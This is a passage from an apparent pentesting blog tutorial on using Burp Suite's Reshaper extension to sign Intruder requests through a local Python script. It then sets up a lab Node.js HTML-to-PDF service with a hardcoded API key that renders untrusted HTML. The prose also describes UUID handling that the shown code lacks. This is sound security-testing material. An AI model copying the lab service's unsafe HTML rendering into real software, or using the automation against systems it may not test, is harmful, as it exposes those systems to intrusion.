&lt;td&gt;Request&lt;/td&gt;
&lt;td&gt;Matching Text&lt;/td&gt;
&lt;td&gt;Request Body&lt;/td&gt;
&lt;td&gt;Params&lt;/td&gt;
&lt;td&gt;name&lt;/td&gt;
&lt;td&gt;Regexp&lt;/td&gt;
&lt;td&gt;.+&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;We&amp;rsquo;ll store our input parameter &lt;code&gt;name&lt;/code&gt; as a variable named &lt;code&gt;name_input&lt;/code&gt;:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Source Value Path&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Variable&lt;/td&gt;
&lt;td&gt;Request Body&lt;/td&gt;
&lt;td&gt;Params&lt;/td&gt;
&lt;td&gt;data&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;name_input&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Next we take our &lt;code&gt;name_input&lt;/code&gt; variable and base64 encode it much like we did
in scenario 4. We store the base64 value in a variable named &lt;code&gt;name_input_base64&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;Run Script:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var Base64 = {

    // private property
    _keyStr : &amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#34;,

    // public method for encoding
    encode : function (input) {
        var output = &amp;#34;&amp;#34;;
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;

        input = Base64._utf8_encode(input);

        while (i &amp;lt; input.length) {

            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);

            enc1 = chr1 &amp;gt;&amp;gt; 2;
            enc2 = ((chr1 &amp;amp; 3) &amp;lt;&amp;lt; 4) | (chr2 &amp;gt;&amp;gt; 4);
            enc3 = ((chr2 &amp;amp; 15) &amp;lt;&amp;lt; 2) | (chr3 &amp;gt;&amp;gt; 6);
            enc4 = chr3 &amp;amp; 63;

            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }

            output = output +
            this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
            this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
        }
        return output;
    },

    // public method for decoding
    decode : function (input) {
        var output = &amp;#34;&amp;#34;;
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;

        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, &amp;#34;&amp;#34;);

        while (i &amp;lt; input.length) {

            enc1 = this._keyStr.indexOf(input.charAt(i++));
            enc2 = this._keyStr.indexOf(input.charAt(i++));
            enc3 = this._keyStr.indexOf(input.charAt(i++));
            enc4 = this._keyStr.indexOf(input.charAt(i++));

            chr1 = (enc1 &amp;lt;&amp;lt; 2) | (enc2 &amp;gt;&amp;gt; 4);
            chr2 = ((enc2 &amp;amp; 15) &amp;lt;&amp;lt; 4) | (enc3 &amp;gt;&amp;gt; 2);
            chr3 = ((enc3 &amp;amp; 3) &amp;lt;&amp;lt; 6) | enc4;

            output = output + String.fromCharCode(chr1);

            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
        }

        output = Base64._utf8_decode(output);

        return output;
    },

    // private method for UTF-8 encoding
    _utf8_encode : function (string) {
        string = string.replace(/\r\n/g,&amp;#34;\n&amp;#34;);
        var utftext = &amp;#34;&amp;#34;;

        for (var n = 0; n &amp;lt; string.length; n++) {

            var c = string.charCodeAt(n);

            if (c &amp;lt; 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c &amp;gt; 127) &amp;amp;&amp;amp; (c &amp;lt; 2048)) {
                utftext += String.fromCharCode((c &amp;gt;&amp;gt; 6) | 192);
                utftext += String.fromCharCode((c &amp;amp; 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c &amp;gt;&amp;gt; 12) | 224);
                utftext += String.fromCharCode(((c &amp;gt;&amp;gt; 6) &amp;amp; 63) | 128);
                utftext += String.fromCharCode((c &amp;amp; 63) | 128);
            }
        }
        return utftext;
    },

    // private method for UTF-8 decoding
    _utf8_decode : function (utftext) {
        var string = &amp;#34;&amp;#34;;
        var i = 0;
        var c = c1 = c2 = 0;

        while ( i &amp;lt; utftext.length ) {

            c = utftext.charCodeAt(i);

            if (c &amp;lt; 128) {
                string += String.fromCharCode(c);
                i++;
            }
            else if((c &amp;gt; 191) &amp;amp;&amp;amp; (c &amp;lt; 224)) {
                c2 = utftext.charCodeAt(i+1);
                string += String.fromCharCode(((c &amp;amp; 31) &amp;lt;&amp;lt; 6) | (c2 &amp;amp; 63));
                i += 2;
            }
            else {
                c2 = utftext.charCodeAt(i+1);
                c3 = utftext.charCodeAt(i+2);
                string += String.fromCharCode(((c &amp;amp; 15) &amp;lt;&amp;lt; 12) | ((c2 &amp;amp; 63) &amp;lt;&amp;lt; 6) | (c3 &amp;amp; 63));
                i += 3;
            }
        }
        return string;
    }
}

var snus = Base64.encode(Reshaper.variables.getGlobalVariable(&amp;#34;name_input&amp;#34;));

Reshaper.event.runThen(&amp;#34;SetVariable&amp;#34;,
{
    text: snus,
  useMessageValue: false,
    targetSource: &amp;#34;Global&amp;#34;,
    variableName: &amp;#34;name_input_base64&amp;#34;
}
);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The reason for base64 encoding our data before sending it to a console is
because many Burp payloads may include single our double quotes which can
escape our terminal command and we end up command injecting ourselves instead
of the server.&lt;/p&gt;
&lt;p&gt;Next we use &lt;em&gt;Run Process&lt;/em&gt; to drop our &lt;code&gt;name_input_base64&lt;/code&gt; variable to our python3
tool called &lt;code&gt;signer.py&lt;/code&gt;.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Command&lt;/th&gt;
&lt;th&gt;Stdin&lt;/th&gt;
&lt;th&gt;Wait for completion&lt;/th&gt;
&lt;th&gt;Capture Output&lt;/th&gt;
&lt;th&gt;Capture Variable Name&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Run Process&lt;/td&gt;
&lt;td&gt;python3 /home/user/tricky-apis/node-api-sign/signer.py {{g:name_input_base64}}&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;Checked&lt;/td&gt;
&lt;td&gt;Checked&lt;/td&gt;
&lt;td&gt;signature&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;If everything is followed correctly 3 variables will be created in the &lt;em&gt;Global Variables&lt;/em&gt;
tab:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-signer-showing-all-variables-used.png&#34; alt=&#34;reshaper-signer-showing-all-variables-used&#34;&gt;&lt;/p&gt;
&lt;p&gt;Next up we will use the &lt;em&gt;Set value&lt;/em&gt; action the replace our form-urlencode
parameters:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Text&lt;/th&gt;
&lt;th&gt;Source Type Value&lt;/th&gt;
&lt;th&gt;Destination Message Value&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;th&gt;Destination Identifier Placement&lt;/th&gt;
&lt;th&gt;Destination Value Path&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Value&lt;/td&gt;
&lt;td&gt;{{g:name_input}}&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Request Body&lt;/td&gt;
&lt;td&gt;Params&lt;/td&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;name&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Value&lt;/td&gt;
&lt;td&gt;{{g:signature}}&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;td&gt;Request Body&lt;/td&gt;
&lt;td&gt;Params&lt;/td&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;signature&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Very nice. However, when we test run our setup everything works correctly with
repeater but never with intruder. Don&amp;rsquo;t forget to activate Intruder
at &lt;em&gt;Capture Traffic From&lt;/em&gt; under settings:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-signer-activate-intruder.png&#34; alt=&#34;reshaper-signer-activate-intruder&#34;&gt;&lt;/p&gt;
&lt;p&gt;Also remember to set the maximum concurrent requests in the Intruder resource
pool to 1. The setup we have created is quite CPU intensive and will not
handle concurrency.&lt;/p&gt;
&lt;p&gt;But on the other hand - it&amp;rsquo;s automagic :)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;reshaper-with-intruder.png&#34; alt=&#34;reshaper-with-intruder&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;scenario-6---using-burp-and-reshaper-to-perform-multiple-request-and-save-pdf-to-disk&#34;&gt;Scenario 6 - Using Burp and Reshaper to perform multiple request and save PDF to disk&lt;/h1&gt;
&lt;p&gt;Who doesn&amp;rsquo;t love a good PDF generator? We at Shelltrail certainly do. However
sometimes multiple steps is needed to provide the content that later
will be used in the generated PDF.&lt;/p&gt;
&lt;p&gt;To simulate this we run the following node.js application:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// mkdir $HOME/node-api-pdf
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// cd $HOME/node-api-pdf
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// npm init -y
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// npm install express body-parser puppeteer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bodyParser&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;body-parser&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;puppeteer&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puppeteer&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3000&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// In-memory storage for HTML
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;storedHTML&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Middleware to check API key
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;apiKeyMiddleware&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;apiKey&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;headers&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;api-key&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;apiKey&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1d8e71ab-8e46-47aa-b25c-a3c8c83b0360&amp;#39;&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Forbidden: Incorrect API key&amp;#39;&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bodyParser&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;text&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt; }));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Insert endpoint
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;post&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/insert&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;apiKeyMiddleware&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;storedHTML&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;;  &lt;span style=&#34;color:#75715e&#34;&gt;// Store HTML content in memory
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTML content stored successfully&amp;#39;&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Generate endpoint
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/generate&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;apiKeyMiddleware&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;storedHTML&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;No HTML content found to generate PDF&amp;#39;&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;browser&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;puppeteer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;launch&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;browser&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;newPage&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setContent&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;storedHTML&lt;/span&gt;, { &lt;span style=&#34;color:#a6e22e&#34;&gt;waitUntil&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;networkidle0&amp;#39;&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pdfBuffer&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pdf&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;format&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A4&amp;#39;&lt;/span&gt; });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;browser&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;contentType&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;application/pdf&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pdfBuffer&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;, () =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Server running on http://localhost:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The application has two endpoints, &lt;code&gt;/insert&lt;/code&gt; and &lt;code&gt;/generate&lt;/code&gt;. The &lt;code&gt;/insert&lt;/code&gt;
takes user supplied input via a POST body and stores in memory and returns a UUID
representing the content. The input should be in HTML.
Upon performing a GET request to &lt;code&gt;/generate/&amp;lt;UUID&amp;gt;&lt;/code&gt; the HTML content will be
converted to a PDF.
Both endpoint requires an API key.&lt;/p&gt;
&lt;p&gt;Storing the HTML content:&lt;/p&gt;
